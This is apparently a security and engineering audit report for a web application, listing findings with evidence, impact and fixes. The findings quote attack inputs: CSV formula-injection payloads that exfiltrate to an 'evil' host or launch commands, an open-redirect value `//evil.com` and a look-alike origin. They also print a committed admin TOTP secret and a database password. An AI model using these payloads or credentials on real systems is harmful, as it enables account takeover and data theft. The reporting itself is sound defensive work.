evidence: seed-test-admin.ts:48 hardcodes DEFAULT_PASSWORD="«rotated-2026-07-04»" (used at :179 for admin@heuresys.com + 5 personas). ensureTotpFactor (:85-101) inserts a factor with auth_mfa_factor_verified=true using FIXTURE_TOTP_SECRETS from apps/api/test/helpers/mfa-fixture-secrets.ts:22-29 (admin secret 'E2EFIXADMIN2HEURESYS2TOTP2AAAAAA', committed base32). .env.example (line 145) documents `pnpm db:seed-test-admin` as the PROD password-reset method, and prior session notes confirm 'Headless TOTP Login Succeeds on Production for Admin' + 'PROD Smoke Test: MFA Login Flow verified on heuresys.com'. Both the password AND the second factor are committed to the repo.
impact: Anyone with repo/CI-log/fork read access can log into the internet-facing PLATFORM_ADMIN account: the committed password clears the password gate and the committed verified TOTP secret deterministically clears the mandatory-MFA step-2 gate, so MFA provides zero protection. The seeder is idempotent and, per its own docs/notes, is run against the live/demo DB — the credentials persist unless TEST_ADMIN_PASSWORD is overridden AND the fixture TOTP factor is removed.
recommendation: Never seed the e2e fixture password or the verified TOTP fixture factor into any internet-reachable DB. Gate seed-test-admin.ts to refuse to run unless NODE_ENV!=production or an explicit ALLOW_FIXTURE_SEED flag is set; require TEST_ADMIN_PASSWORD (no default) for admin; keep the fixture-TOTP path test-only. Rotate the admin@heuresys.com password and delete the e2e-fixture TOTP factor on the live host now.
invariant_ref: I7 sys_auth_* separation; mandatory-MFA policy (S983 WS-E)

evidence: readNextParam() only validates `next && next.startsWith("/")` (line 27) before returning it; redirectFor() then calls `router.replace(dest)` (line 95) with that value. `"//evil.com".startsWith("/")` is true, and Next's app-router router.replace resolves `//evil.com` via `new URL('//evil.com', location)` to a different origin (https://evil.com) and performs a hard external navigation. Backslash variants (`/\evil.com`) are similarly not excluded.
impact: An attacker sends a victim a crafted link https://<app>/login?next=//evil.com. After the victim authenticates on the legitimate origin, they are redirected to the attacker's site (CWE-601), enabling phishing / credential-reharvest / malicious-download landing pages under the trust of the real login flow.
recommendation: Tighten the guard to reject protocol-relative and backslash-prefixed values, e.g. `next.startsWith('/') && !next.startsWith('//') && !next.startsWith('/\\')`, or parse with `new URL(next, origin)` and assert same-origin before accepting.

evidence: csvCell (csv.ts:26-30) returns `/[",\r/n]/.test(s) ? '"'+s.replace(...)+'"' : s` — it quotes only for comma/quote/CR/LF and NEVER prefixes or escapes cells that begin with =, +, -, @, TAB or CR. This same csvCell is the sole escaper for BOTH the analytics multi-section export (toCsv, csv.ts:70) AND the generic list exporter (serializers.ts:40-45 listToCsv), which the global onSend hook (lib/export/hook.ts:79) applies to ~85 authenticated `{items,total}` list endpoints via `?format=csv`. Attacker-controlled free-text reaches these cells unmodified: e.g. the PUBLIC unauthenticated POST /v1/leads (leads/routes.ts:18) stores name/company/message (LeadCreateSchema bounds length only, leads.ts:16-26), later exported by a PLATFORM_ADMIN through GET /v1/leads?format=csv (leads/routes.ts:5 documents it is CSV-exportable). Other free-text sinks (skill_name, organization_unit_name, position_title used as analytics dimensions) flow the same way.
impact: A cell value beginning with =, +, -, @ is interpreted as a formula by Excel/LibreOffice/Google Sheets when the exported CSV is opened. A crafted value such as `=cmd|'/c calc'!A1` or `=HYPERLINK("http://evil/"&A1)` enables data exfiltration or (via legacy DDE, on click-through of the spreadsheet warning) command execution in the victim's client. Because the leads form is unauthenticated, an external attacker can plant the payload and it detonates in a PLATFORM_ADMIN's spreadsheet at export time.
recommendation: In csvCell, before the RFC-4180 quoting, neutralize spreadsheet-formula cells: if the string's first character is one of = + - @ TAB(0x09) CR(0x0D), prefix it with a single quote (') or a zero-width guard, then apply the existing quoting. Apply once in csvCell so both analytics/csv.ts and lib/export/serializers.ts inherit the fix. (The xlsx path via exceljs writes string cells as text and is not affected; only CSV needs the guard.)

evidence: data-classes.ts defines dataClassOf()/isSensitiveResource()/SENSITIVE_DATA_CLASSES as the F2 taxonomy that is supposed to select the authorizing axis (header: 'F3 consumes dataClassOf to gate sensitive reads'). A repo-wide grep for dataClassOf|isSensitiveResource|isSensitiveClass|SENSITIVE_DATA_CLASSES returns matches ONLY inside data-classes.ts itself — no route, middleware, or service consumes it. Enforcement is instead hand-wired: each of the 16 sensitive modules independently imports resolveOrgReadScope/canReadOrgTarget (verified in compensation/service.ts:23,51,57). There is no central preHandler nor a drift test binding the sensitive resource list to the routes that must call the resolver.
impact: The org-axis gate that protects PERSONAL/COMPENSATION/SKILL/EVALUATION data (I18/I20) is a per-module convention, not an invariant. A newly added sensitive module (or a new sensitive endpoint in an existing module) that forgets resolveOrgReadScope/canReadOrgTarget leaks another user's sensitive records cross-user with no compile-time or test-time signal — exactly the D-50 leak class. The taxonomy that could detect the omission is present but inert.
recommendation: Wire the F2 taxonomy into an actual F3 guard: either a shared preHandler/helper keyed on auth_permission_resource that fails closed when a route serves an isSensitiveResource() resource without producing a resolved OrgReadScope, or add a drift/coverage test that asserts every route whose resource ∈ RESOURCE_DATA_CLASS invokes resolveOrgReadScope/canReadOrgTarget. Until then, treat each sensitive module as individually audit-required.

evidence: for (const e of TREND_ENTITIES) { ... await q.query(...) } issues one round-trip per entity (5 entities: users/positions/orgUnits/learningPaths/learningGaps, lines 314-318). Inside each query a generate_series of `weeks` buckets drives a correlated subquery `SELECT count(*) FROM <table> t WHERE t.<ts> < wk.w + interval '1 week'` (lines 353-367). EXPLAIN confirms one Seq Scan of the entity table per bucket (SubPlan 1 -> Seq Scan on sys_positions, filtered). pg_stat_statements shows the two 'WITH wk AS (...' variants at 1112 calls/166,879 ms and 730 calls/74,759 ms (~150 ms and ~102 ms mean).
impact: Per dashboard load the widget costs 5 sequential round-trips and re-scans each entity table once per week bucket: cost is O(entities x weeks x rows). Cheap today (~150 positions) but the `users` entity already re-scans ~14K rows x weeks; at tenant scale (tens of thousands of rows, 52-week windows) this becomes a multi-second hotspot.
recommendation: Replace the per-bucket correlated count with a single cumulative series per entity: bucket rows with date_trunc('week', ts) + GROUP BY, then a window SUM() OVER (ORDER BY week) for the cumulative count; combine the 5 entity queries into one UNION ALL to collapse the round-trips.

evidence: vitest.config.ts:3-4 states integration tests 'rely on the live OCI VM database via tunnel :5433 — the same .env that `pnpm dev` uses.' No per-test transaction/rollback and no ephemeral DB: cleanup is done via ~110 hand-written scoped DELETEs and afterAll hooks. Correctness is serialized (fileParallelism:false, maxWorkers:1, lines 21-23) explicitly to avoid refresh-rotation races on the shared DB, which also couples file execution order (a file leaving fixture drift, e.g. mfa-enroll-confirm, affects later files).
impact: A crashed/aborted run (or a failing afterAll) leaves real drift in the same database `pnpm dev` serves; tests are not hermetic and cannot be parallelized; the D-23/D-29 debt classes exist solely to paper over this. A test run and a dev session mutating the DB concurrently can corrupt each other.
recommendation: Run integration tests against an ephemeral/branch database (or wrap each test in a transaction with rollback). At minimum isolate the test DB from the dev DB used by `pnpm dev`.

evidence: All self-hosted workflows run `pnpm install --frozen-lockfile` (build-web.yml:57, test-integration.yml:69, etc.) on `runs-on: [self-hosted, oci-vm]` (the prod host). The fork-PR guard (D-08) blocks forks, but the `if:` explicitly permits same-repo PRs 'Dependabot branches live in this repo', and pnpm 9.15 runs dependency build/postinstall scripts by default. build/playwright workflows also run `pnpm build` on the runner.
impact: A dependency bump proposed by Dependabot (or any same-repo branch) triggers install + build on the production host before human review, so a compromised/typosquatted transitive package's install/build script executes on prod. The fork guard does not cover this same-repo path.
recommendation: Move dependency-graph-executing CI (install/build/test) to ephemeral GitHub-hosted runners, or set pnpm to ignore dependency build scripts on CI (pnpm config side-effects-cache / `--ignore-scripts` with an explicit allowlist) and keep the prod self-hosted runner for deploy-only steps. Require label/human approval before Dependabot PRs run on the prod runner.

evidence: verifyCsrf validates the Origin/Referer with `if (origin && env.ADMIN_ORIGIN && !origin.startsWith(env.ADMIN_ORIGIN))`. `startsWith` on a bare origin has no boundary, so an attacker origin such as `https://app.heuresys.com.evil.com` (or `http://localhost:30000` when ADMIN_ORIGIN=`http://localhost:3000`) satisfies the prefix and passes the check.
impact: Weakens the secondary CSRF defense: the Origin/Referer gate no longer reliably pins requests to the admin SPA origin. Not solely exploitable — the primary double-submit token (cookieCsrf===headerCsrf, line 27) is still required — so it is a defense-in-depth erosion, not a standalone CSRF hole.
recommendation: Compare the parsed URL origin for exact equality (`new URL(origin).origin === env.ADMIN_ORIGIN`) instead of `startsWith`, or match against an explicit allowlist of full origins.

evidence: `git ls-files` for apps/web/src/**/error.tsx, global-error.tsx and apps/showcase equivalents returns zero files; a grep for ErrorBoundary/componentDidCatch across src returns nothing. The ~90 route segments are all complex 'use client' components. Data-fetch failures are handled via TanStack `isError` branches, but a render-time exception (e.g. an API payload that passes the TS type yet breaks a `.map`, or a throw inside a @heuresys/ui primitive) has no scoped fallback.
impact: An uncaught render error in any segment propagates to the root and white-screens the whole authenticated shell with Next's generic production error page instead of a scoped, recoverable fallback; without a global-error.tsx even root-layout errors are ungraceful, and there is no client-side error reporting hook.
recommendation: Add a root `app/global-error.tsx` plus a segment `app/(authenticated)/error.tsx` (and ideally per-heavy-section boundaries) that render a localized retry UI and report to observability.

evidence: The login/enroll/MFA error banners use `text-sm text-red-600 bg-red-50 border border-red-200` (repeated at lines 496, 573, 594, 643, 721) rather than the project's semantic tokens (text-danger / bg-danger/10 / border-danger/40) used correctly elsewhere, e.g. me/security/page.tsx:419-420. bg-red-50 is a near-white fill; the theme boot script (app/layout.tsx:23) defaults the app to the `dark` class, so on the dark login screen the error box renders as a bright light panel inconsistent with the design system.
impact: Visual/theme inconsistency on the dark-default login surface (bright box on dark chrome). Not a functional or accessibility failure (dark-red text on light-red fill remains legible), but it bypasses the design-token system and will not follow palette/theme changes.
recommendation: Replace the hardcoded red-* utilities with the semantic danger tokens (text-danger, bg-danger/10, border-danger/40) as used in me/security and content pages.

evidence: verifyCsrf validates the request origin with `!origin.startsWith(env.ADMIN_ORIGIN)`. With ADMIN_ORIGIN='https://app.heuresys.com', an Origin/Referer of 'https://app.heuresys.com.evil.com' satisfies startsWith() and is accepted. Also, when the header is absent the check is skipped entirely.
impact: The origin/referer layer is defence-in-depth on top of the double-submit token (and cookies are SameSite=Lax), so this alone does not grant CSRF — the primary control still requires the attacker to know the CSRF token. But the secondary control is bypassable by any attacker-controlled sub/look-alike domain, weakening the layered defence (e.g. if the CSRF token ever leaks via a subdomain XSS or logging).
recommendation: Compare the parsed origin for exact host equality (URL#origin === env.ADMIN_ORIGIN) rather than startsWith; optionally maintain an explicit allowlist array.

evidence: vm-bootstrap.sh:58 and dev-bootstrap.sh:57 run `curl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm/$NVM_VERSION/install.sh | bash`. NVM_VERSION is pinned to the tag 'v0.40.1' (vm-bootstrap.sh:33, dev-bootstrap.sh:24), but the fetched script is piped straight to bash with no SHA256/GPG verification. vm-bootstrap runs on the production VM where the invoking user has sudo (script uses `sudo apt-get`).
impact: If raw.githubusercontent.com content for that tag is tampered with (tag force-move, CDN/MITM, upstream account compromise), arbitrary code executes with the operator's privileges on the production host during bootstrap. The tag pin reduces but does not remove the risk (no content integrity check).
recommendation: Download the installer to a file, verify a pinned SHA256 (or use a vendored copy committed to the repo), then execute; or install Node via the distro/corepack path already present. Never pipe a network fetch directly into a privileged shell on the prod host.

evidence: generate_wave1_column_mappings.mjs:43 sets `if (!process.env.PGPASSWORD) process.env.PGPASSWORD = 'heuresys';` — a committed DB password fallback matching POSTGRES_USER=heuresys (.env.example:30). run-wave1-fullscale.mjs:34 defaults ADMIN_PASSWORD to the same committed '«rotated-2026-07-04»' used to log in to :3001 as admin@heuresys.com.
impact: Reveals the likely real dev/DB password ('heuresys') and normalizes reuse of the committed admin credential across tooling; if either script is pointed at the shared prod DBMS (PC tunnel :5433 == VM :5432 per vm-deploy.sh:112) these defaults connect/authenticate with publicly-known values.
recommendation: Remove the hardcoded fallbacks; require PGPASSWORD/ADMIN_PASSWORD to be set explicitly (fail fast when absent). Use a strong, non-committed DB password and rotate 'heuresys' if it is the live value.

evidence: env-key-merge.sh:64-75 scp's the full LOCAL .env (JWT_PRIVATE_KEY, MFA_ENCRYPTION_KEY, COOKIE_SECRET, POSTGRES_PASSWORD, …) to `/tmp/.env.local-keys.$stamp` on the remote, runs the merge, then `rm -f` the temp. The file is created in world-readable /tmp with default umask during the merge window.
impact: For the duration of the merge, every secret in the local .env sits in a predictable /tmp path on the remote host, readable by other local users/processes on a multi-tenant box. Mitigated by prompt deletion but not by permissions.
recommendation: Create the temp with a private umask/`mktemp` mode 600 in the user's home (not /tmp), or stream the file over ssh stdin without landing it on disk; keep the immediate cleanup.

evidence: sys_readiness_scores.readiness_score_tenant_id is `NOT NULL REFERENCES sys.sys_tenancies(tenant_id) ON DELETE CASCADE` (000017:168) but the only non-PK indexes on the table lead with (user_id, position_id, computed_at) (000017:184-185) — no index leads with tenant_id. Live DB confirms 52 tenant_id FK columns in sys with no supporting/leading index; 30 of them cascade from sys_tenancies (verified via pg_constraint/pg_index: readiness_scores, kpi_measurements, kpi_definitions, gap_analysis_results, compensation_recommendations, employee_position_fit_scores, succession_scores, ...). The newer 'insights P2' wave DID add a dedicated tenant index — sys_succession_readiness_scores has `sys_succession_readiness_tenant_idx ON (tenant_id)` (000092:84-85) — proving the omission on the older tables is an oversight, not a deliberate design choice.
impact: Two costs. (1) Every tenant-scoped read whose other predicates can't ride an existing composite falls back to a sequential scan on the tenant filter — the exact hot path for I5 isolation (WHERE ..._tenant_id = $1). (2) Deleting/offboarding a tenancy forces a full-table scan of each of the 30 CASCADE children to find rows to delete, i.e. O(rows) per table plus heavy locking. Impact is low at current dev-data volumes but grows linearly and is invisible until a large tenant or a tenant-delete hits it.
recommendation: Add `CREATE INDEX IF NOT EXISTS ..._tenant_idx ON <table>(<...>_tenant_id)` for the 52 tables (mirror the pattern already used in 000092:84-85 and 000006:35-36 / 000053:52-53), or fold tenant_id as the leading column into the existing composite where a composite already exists. Prioritize the 30 CASCADE-from-tenancies tables.

evidence: sys_kpi_measurements.kpi_measurement_position_id `REFERENCES sys.sys_positions ON DELETE CASCADE` (000015:155) is only covered as the 2nd column of the composite `(kpi_measurement_kpi_id, kpi_measurement_position_id, period_end DESC)` (000015:169-170) — so a filter by position_id alone cannot use it. Live pg_index scan lists 46 non-audit business FK columns in sys with no leading index (position_id on kpi_measurements, gap_analysis_results, employee_position_fit_scores, reward_gates, skill_gap_scores, succession_pools; user_id on kpi_assessment_results, succession_scores, successor_candidates; etc.).
impact: Position-centric roll-ups (I1) that scan 'all measurements/scores for one position' or 'all scores for one user' across KPIs sequentially scan these tables. Amplified by D-18 insights append-accumulation: the scoring tables accumulate historical rows over time, so the scanned footprint keeps growing.
recommendation: Add single-column (or reordered composite) indexes on position_id / user_id where the access pattern is by-position or by-user alone; verify against actual query plans in apps/api scoring/insights read paths before adding to avoid write-amplification on append-heavy tables.

evidence: Both `activity_class_mapping_source_id` (000007:65) and `activity_class_mapping_target_id` (000007:66) are FKs to sys_activity_classifications ON DELETE CASCADE, but the only supporting index is `(source_id, target_id)` (000007:81), which leads with source_id. A lookup or cascade by target_id alone has no usable index (confirmed by pg_index: target FK flagged unindexed).
impact: Reverse-direction crosswalk lookups (find mappings pointing AT a classification) and cascade-delete of a target classification seq-scan the mappings table. Low cardinality today (ATECO/NACE crosswalk), so impact is small.
recommendation: Add `CREATE INDEX IF NOT EXISTS ... ON sys_activity_classification_mappings(activity_class_mapping_target_id)`.

evidence: Live DB: relname=import_validation_results, n_live_tup=1,553,686, n_dead_tup=38,618, pg_total_relation_size=547 MB. last_autovacuum=NULL and last_autoanalyze=NULL (never run); last_analyze=2026-06-01 with n_mod_since_analyze=109,152. reloptions empty (no per-table autovacuum tuning); global autovacuum=on but 2.4% dead-ratio never crosses the 20% default trigger. The table is append-only jsonb (one row per validation, inserted at brownfield-wave-executor/engine.ts:348/420/683/722, repository.ts:533, upsert-sql.ts:653/831); grep found no DELETE/TRUNCATE/retention anywhere.
impact: Unbounded growth of a 547 MB audit table with no pruning; planner statistics are >1 month stale after 109K modifications, which can produce bad plans for the queries that read it (e.g. the count(DISTINCT payload->>...) statement seen in pg_stat_statements). Autovacuum will not naturally reclaim the dead tuples at the current ratio, so bloat only accumulates.
recommendation: Add a retention/partition strategy (e.g. drop or partition by import_validation_result_run_id / created_at after N days), and set per-table autovacuum_analyze_scale_factor/vacuum_scale_factor low (or an absolute threshold) so stats stay fresh on this high-write table. A one-off ANALYZE is warranted immediately.

evidence: ~28 repositories build search filters as `params.push('%'+search+'%')` + `col ILIKE $n` (e.g. learning-modules:76, learning-paths:64, job-roles:64, kpi-definitions:73, skill-categories:56, goals:63, okrs:55, predictions:46, surveys:45/121, and more). A leading '%' defeats btree indexes. Trigram-index inventory returned only 2 GIN/trgm indexes in the whole DB: sys_skills_name_trgm_idx and sys_skill_aliases_label_trgm_idx — so every other searched column (learning_modules 7.4K rows, learning_paths 4.7K, job_roles, kpi_definitions, etc.) falls back to a full seq scan on each search.
impact: Each search on these endpoints is a full table scan. Negligible on the current small reference tables (<10K rows) but degrades linearly as catalogs grow, and the pattern is duplicated across ~28 modules so any growth touches all of them.
recommendation: Add pg_trgm GIN indexes on the name/code columns actually searched (mirroring the two that already exist for sys_skills), or centralize search in a helper that uses a trigram/tsvector index; at minimum add trgm indexes on the larger catalogs (learning_modules, learning_paths, job_roles, kpi_definitions).

evidence: Both FKs exist with ON DELETE CASCADE: activity_class_mapping_source_id and activity_class_mapping_target_id -> sys_activity_classifications. Index inventory on sys_activity_classification_mappings shows only the pkey and a composite UNIQUE (source_id, target_id). The composite covers lookups/cascade on source_id (leading column) but leaves target_id with no usable index. Table has 5,730 live rows.
impact: Deleting or reparenting a classification row triggers a seq scan of the mappings table for the target_id cascade check, and target-side joins/lookups cannot use an index. Small today (5.7K rows) so impact is minor, but it is the classic unindexed-FK pattern that scales poorly.
recommendation: Add a btree index on activity_class_mapping_target_id (the source side is already covered by the composite unique index).

evidence: The `WITH RECURSIVE scoped` base CTE (line 783) is rebuilt and shipped as a separate statement for each of 5 queries (totals 795, spanStats 807, topSpan 821, depth 839, reach 862) — 5 round-trips that each recompute the scoped position set. topSpan additionally evaluates `(SELECT count(*) FROM scoped c WHERE c.reports_to = s.position_id)` three times per row (SELECT line 829 + ORDER BY lines 831-832), an O(n^2) nested loop over the CTE. reach's descendants CTE is O(nodes x subtree).
impact: Bounded today (~158 scoped positions, LIMIT 15, depth<100 guard) so latency is small, but the org-network endpoint pays 5 sequential recomputations of the same recursive set and a triple-evaluated correlated count that grows quadratically with the scoped position count.
recommendation: Compute the scoped set once (single statement with multiple CTEs, or a temp/materialized CTE) and reuse it; compute direct-reports once via a GROUP BY (reports_to) join instead of a per-row correlated count evaluated three times.

evidence: cleanupFactors() (lines 59-64) deletes ALL sys_auth_mfa_factors rows for the persona with NO E2E_FIXTURE_LABEL exclusion — unlike the safe DELETE_THROWAWAY_FACTORS used by mfa.integration.test.ts:47 and webauthn.integration.test.ts:47 (which preserve the fixture). beforeAll (lines 95-100) snapshots hadFixture then wipes; afterAll (lines 104-110) re-seeds via ensureFixtureTotpFactor only if hadFixture. The restore is afterAll-only, not per-test try/finally, and not transactional.
impact: If the process is killed, or the first cleanupFactors() in afterAll succeeds but ensureFixtureTotpFactor throws (transient DB jitter), TOTP_USER/EMAIL_USER are left without their fixture factor. Under the default mandatory-MFA enforcement, those shared-DB personas are stuck in mfa_enrollment_required, cascading login failures across every subsequent MFA-dependent test file and the next run.
recommendation: Wrap the wipe/restore in a SAVEPOINT or unconditionally re-assert the fixture factor in a finally block; prefer the throwaway-scoped DELETE and enroll into a distinct temporary persona instead of wiping a committed fixture.

evidence: server.ts:36 correctly calls loadRolePermissionCacheWithRetry(app.log) (D-20 resolved in code), but rbac-cache-boot-retry.test.ts:8 states 'the loader is injected, so these tests exercise only the retry/backoff/fail-fast policy' — all three tests pass a fake loader. No test boots the server / asserts the boot path uses the retry wrapper rather than the bare loadRolePermissionCache.
impact: A future refactor swapping server.ts back to the non-retrying loadRolePermissionCache (the original D-20 defect) would pass the entire suite; the test gives false confidence about the boot wiring.
recommendation: Add a test asserting the boot entrypoint invokes the retry wrapper (spy on the module export or drive start() with an injected failing-then-recovering loader).

evidence: config/env.ts is the canonical Zod-validated loader (EnvSchema lines 50-198, parsed at :200), but three vars are consumed directly: auth/routes.ts:91 `Number(process.env.AUTH_LOGIN_RATELIMIT_MAX) || 10` (login rate-limit cap), brownfield-wave-executor/loader.ts:29 `process.env.WAVE1_LEGACY_DATA_DIR`, engine.ts:604 `process.env.WAVE1_DEBUG_LIMIT`. Grep of .env.example confirms none of the three are documented there.
impact: These knobs escape the single-source-of-truth env validation. The login rate-limit override is security-adjacent: an invalid/typo value or a falsy `=0` silently yields the `|| 10` fallback (NaN-safe but masks operator intent), and none of the three is discoverable via .env.example, creating config drift across the Windows/Mac/VM/linux-pc fleet aligned by align-clones.sh.
recommendation: Fold the three vars into EnvSchema (e.g. AUTH_LOGIN_RATELIMIT_MAX: z.coerce.number().int().positive().default(10); the two WAVE1_* as optional strings) and read them via env.*; document them in .env.example so boot-time validation replaces silent per-call fallback.

evidence: me/repository.ts is 1481 lines (largest repo in the codebase; analytics/repository.ts is second at 1152). The `me` facade also has the broadest cross-module fan-in: me/routes.ts:44-45 import teamsService and contentService, and me/service.ts:20 imports `* as authRepo from ../auth/repository.js`. No layering violation (imports are public services/repo fns per grep), but the concentration is real.
impact: The self-service (/v1/me) surface aggregates teams, content and auth internals into one high-churn module, so changes to those domains' public shapes ripple into `me`, and the 1481-line repository is the single hardest file to modify safely. This is the god-file blast-radius flagged for review; it is a maintainability / change-amplification risk rather than a correctness bug.
recommendation: When next touched, split me/repository.ts along its sub-domains (profile/preferences/inbox/etc.) and consider having `me` depend on narrow read-facades exported by teams/content/auth rather than reaching into their repositories, to shrink the fan-in.

evidence: POST / is guarded by `preHandler: [app.verifyCsrf]` only; there is no `requirePermission(...)`. The PLATFORM_ADMIN gate lives in the service (service.ts:18 `ensurePlatformAdmin`, invoked at service.ts:37). This deviates from the project convention 'requirePermission su ogni route' (the module comment acknowledges 'service-gated ... no granular permission in the seed').
impact: Authorization for a sensitive cross-tenant write (materializes org-units + positions into an input-provided tenantId) is not visible at the HTTP boundary, so it is harder to audit and easier to regress silently (e.g. a future refactor that changes the service call path would drop the gate with no route-level backstop). Currently NOT exploitable — the service gate is present and called first.
recommendation: Add an explicit route-level guard (a requirePermission code, or a small requirePlatformAdmin preHandler) so the authz decision is co-located with the route, consistent with the rest of the surface; or formally document this as a sanctioned exception with a drift test.

evidence: `rolePermissionCache` is populated exactly once via setRolePermissionCache, and grep confirms setRolePermissionCache is called only from cache-loader.ts:92 (boot path, server.ts:36). No admin endpoint, TTL, or LISTEN/NOTIFY re-loads it at runtime.
impact: Any change to sys_auth_role_permissions / role or permission seeds (grant or, more importantly, REVOKE) is invisible to a running API until a full process restart — a stale-authorization window during which a revoked permission still passes requirePermission(). Operationally acceptable for rare, restart-coupled changes but undocumented as a hard constraint.
recommendation: Expose a PLATFORM_ADMIN-gated cache-reload route (reusing loadRolePermissionCache) and/or a short TTL / pg NOTIFY invalidation, so permission revocations take effect without a redeploy.

evidence: When env.API_DOCS_ENABLED is true, fastifySwaggerUi (/docs) and GET /openapi.json (216) are registered with no auth preHandler and no requirePermission — they sit before the module routes and are reachable by anyone. The only protection is the flag defaulting to false (env.ts:197, correctly parsed as explicit 'true'/'false' to avoid the Boolean('false') footgun).
impact: If the flag is ever flipped on a public origin, the full ~407-endpoint /v1/* contract (paths, schemas, params) is exposed unauthenticated, easing reconnaissance. Protection currently rests entirely on operator discipline / default-off.
recommendation: Even when enabled, gate /docs and /openapi.json behind authentication (requirePermission or an authenticated edge), so enabling docs is safe by construction rather than by deployment discipline.

evidence: scope/audit.ts creates a standalone `pino({ name: 'scope-audit' })` with NO redact config, invoked inside request-handling (resolver.ts). db/client.ts:37 logs pool idle-client errors via raw `console.error(JSON.stringify(...))`. Neither path inherits app.ts LOG_REDACT_PATHS (app.ts:157) nor the per-request child logger / requestId.
impact: Audit and pool-error lines are outside the central redaction pipeline and carry no request correlation id. Today they emit no secrets (audit logs userIds/tenantId/axis; pool logs error name+message), but any future field added to ScopeAccessEvent would not be redacted, and the split log shape hurts diagnosability.
recommendation: Emit scope-audit through the Fastify request logger (or share the LOG_REDACT_PATHS config with the standalone pino instances), and route pool errors through the app logger where a logger is available.

evidence: listRewardGates (line 51-60) resolves resolveOrgReadScope + canReadOrgTarget to gate cross-user comp reads by the actor's organizational sub-tree (comment cites 'ADR-0027 F3 (D-50)'). The mutation createRecommendation (line 68-92) validates only that the target user's tenant == actor tenant (findUserTenantId, line 73-84) and never calls canReadOrgTarget/resolveOrgReadScope. Same asymmetry in createHandoffRecord (line 94-108).
impact: Per ADR-0027 bi-axial authz, sensitive-data writes should also be org-axis gated. A holder of compensation_intelligence:update whose org scope is a sub-tree could create/handoff compensation recommendations for ANY user in the whole tenant, outside their sub-tree — the read surface would hide those users but the write would not. Currently mitigated only coincidentally: migration 000169 grants compensation_intelligence:update solely to HRMS_MANAGER (+ TENANT_ADMIN/PLATFORM_ADMIN), all tenant-wide roles; the gap becomes exploitable the moment the perm is delegated to a managerial/sub-tree role.
recommendation: Mirror the read path: call canReadOrgTarget(pool, actor, body.userId, tenantId) in createRecommendation (and gate the handoff subject) before insert, returning 404 on out-of-scope target. Makes the org-axis invariant enforced in code rather than dependent on grant scoping.
invariant_ref: ADR-0027 bi-axial authz (org-axis gate on sensitive data)

evidence: app.patch("/notification-preferences", { preHandler: [app.verifyCsrf, requirePermission("notification:read:self")] }, ...). Every other mutation in this file uses an action-scoped perm (user_profile:update:self, skill:self_assess, notification:mark_read:self, me:preferences:update, etc.); this PATCH uniquely authorizes a write with the :read:self perm.
impact: Authorization-granularity inconsistency: a principal granted only notification read (but intentionally denied preference mutation) can still overwrite their notification preferences. Self-scoped and low blast radius, but it breaks the module's read-vs-write permission separation and could matter if the two perms are ever split by policy.
recommendation: Introduce/route to a dedicated write perm (e.g. notification:update:self or notification_preference:update:self) consistent with the me:preferences:update pattern used one route below (line 280).

evidence: app.post("/", { preHandler: [app.verifyCsrf] }, ...) — no requirePermission; the PLATFORM_ADMIN gate lives only in service.ts (line 19-20 throws ForbiddenError TENANT_MATERIALIZE_ADMIN_ONLY, invoked from materialize). GET /archetypes (line 19) also has no requirePermission. This is one of the few route files with zero requirePermission (also public-stats — intentionally public — and skill-proficiency-levels).
impact: Authorization for a high-impact platform operation (materialize a tenant) is enforced away from the route surface. It IS currently enforced, so no active bypass, but it deviates from the 'requirePermission on every route' invariant and is fragile: a future route added to this plugin, or a caller invoking the service without the guard, would silently lack authz. Harder to audit than the uniform preHandler pattern.
recommendation: Add a route-level guard (a requirePermission for a materialize perm, or a small requirePlatformAdmin preHandler) so authz is visible at the route, keeping the service check as defense-in-depth.

evidence: me/repository.ts = 1481 LOC (45+ exported query functions across profile/contracts/payslips/surveys/learning/gaps/certs/inbox/kpis/preferences), brownfield-wave-executor/engine.ts = 1387 LOC, analytics/repository.ts = 1152 LOC, auth/mfa-service.ts = 1085 LOC, brownfield-wave-executor/upsert-sql.ts ~1050 LOC (verified via wc -l).
impact: Maintainability/review-cost hotspots: large multi-responsibility files raise change-risk, make blame/diff review harder, and concentrate many distinct concerns (me/repository mixes 10+ unrelated self-domains) in one unit. No functional defect, but they are the top WS1 code-quality debt surface.
recommendation: Split me/repository.ts by sub-domain (profile / surveys / learning / inbox+notifications / kpis) behind the same DbConnector seam; consider extracting the SQL-builder helpers in upsert-sql.ts/engine.ts. Purely structural, no behavior change.

evidence: pathFor(): const p = resolve(join(this.root, key)); if (!p.startsWith(this.root)) throw ... . The prefix check has no trailing path.sep, so a resolved path in a sibling directory sharing the root's name prefix (root '/data/media' vs '/data/media-x') would pass the guard.
impact: Defense-in-depth weakness only: keys are server-generated '<tenantId>/<mediaId>' UUID segments (media-service.ts:122), never user input, so no traversal is reachable today. The comment even advertises this as the future-proofing guard for a caller that passes user input — where the missing separator boundary would then be a real containment gap.
recommendation: Compare against this.root + path.sep (or use path.relative(root, p) and reject when it starts with '..' or is absolute), so the guard actually holds if the invariant 'keys are UUIDs' is ever relaxed.

evidence: const sourceTable = m.source_table_name.replace(/"/g, '""'); const pkColQuoted = pkCol.replace(/"/g, '""'); (line 205-206) then embedded into the INSERT...SELECT text — whereas upsert-sql.ts consistently escapes identifiers with pg-format's format('%I', ...) / format('sys.%I', ...) (e.g. upsert-sql.ts:582,588,906). pkCol derives from source_table_metadata.pk_columns (line 202-203).
impact: Correctness/consistency risk. The manual doubling of double-quotes is a partial identifier escape (it does not itself wrap the value in quotes, and does not defend against embedded NULs/other identifier hazards the way %I does). Inputs are system-controlled brownfield metadata (platform-scoped ingestion), so injection is not currently reachable, but the divergence from the module's own %I convention is fragile and easy to get subtly wrong on the next edit.
recommendation: Use pg-format format('%I', m.source_table_name) / format('%I', pkCol) here too (as the rest of the executor does) rather than a bespoke replace().

evidence: app.get("/", { schema: {...} }, ...) — authenticated-only, no requirePermission. Sibling catalog modules (skills, skill-categories, skill-families, assessment-methods) attach requirePermission on their reads.
impact: Reference/catalog data only (proficiency-level enum-like rows), so disclosure impact is negligible, but it is an inconsistency with the module pattern and with peer catalog routes — a reviewer cannot tell from the route whether the omission is intentional.
recommendation: Either attach the catalog read perm used by peer skill routes, or add a short comment documenting the deliberate authenticated-only exemption (as public-stats does).

evidence: JSDoc on recompute reads 'extract features → score → append (latest-wins)'. The underlying write is now a single-statement WITH del AS (DELETE ...) INSERT ... (repository.ts:200-231, upsertFlightRiskScores), i.e. delete-then-insert, explicitly the D-18 fix that stopped the monotonic append growth.
